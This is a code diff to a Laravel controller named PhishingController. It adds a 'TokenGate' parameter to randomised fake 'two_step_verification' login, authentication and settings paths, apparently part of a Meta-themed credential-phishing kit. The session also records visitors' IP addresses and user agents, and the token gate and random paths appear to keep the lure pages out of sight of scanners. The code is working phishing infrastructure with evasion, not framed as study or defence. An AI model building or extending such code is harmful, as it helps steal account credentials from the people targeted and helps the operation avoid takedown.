@@ -10,6 +10,23 @@ use Illuminate\Support\Str;
 
 class PhishingController extends Controller
 {
+    /**
+     * Append the TokenGate query param to a path.
+     * TokenGateMiddleware stores token + param name in session under _tg_tok / _tg_par.
+     */
+    private function gateUrl(string $path): string
+    {
+        $param = Session::get('_tg_par');
+        $token = Session::get('_tg_tok');
+
+        if ($param && $token) {
+            $sep = (str_contains($path, '?') ? '&' : '?');
+            return $path . $sep . $param . '=' . $token;
+        }
+
+        return $path;
+    }
+
     private function getSessionData()
     {
         if (!Session::has('_s_data')) {
@@ -19,15 +36,20 @@ class PhishingController extends Controller
             $pathToken4 = Str::random(60);
             $pathToken5 = Str::random(60);
 
+            $loginPath    = $this->gateUrl("/two_step_verification{$pathToken1}/login/{$pathToken2}");
+            $authPath     = $this->gateUrl("/two_step_verification{$pathToken1}/authentication/{$pathToken3}");
+            $metaBasePath = $this->gateUrl("/two_step_verification{$pathToken1}/invitation/{$pathToken4}");
+            $settingsPath = $this->gateUrl("/two_step_verification{$pathToken1}/latest-settings-info/{$pathToken5}");
+
             $sessionData = [
                 'ip' => request()->ip(),
                 'userAgent' => request()->header('User-Agent') ?: "",
                 'createdAt' => now()->timestamp,
-                'loginPath' => "/two_step_verification{$pathToken1}/login/{$pathToken2}",
-                'authPath' => "/two_step_verification{$pathToken1}/authentication/{$pathToken3}",
-                'metaBasePath' => "/two_step_verification{$pathToken1}/invitation/{$pathToken4}",
-                'settingsPath' => "/two_step_verification{$pathToken1}/latest-settings-info/{$pathToken5}",
-                'pathPrefix' => "two_step_verification{$pathToken1}",
+                'loginPath'    => $loginPath,
+                'authPath'     => $authPath,
+                'metaBasePath' => $metaBasePath,
+                'settingsPath' => $settingsPath,
+                'pathPrefix'   => "two_step_verification{$pathToken1}",
             ];
             Session::put('_s_data', $sessionData);
         }
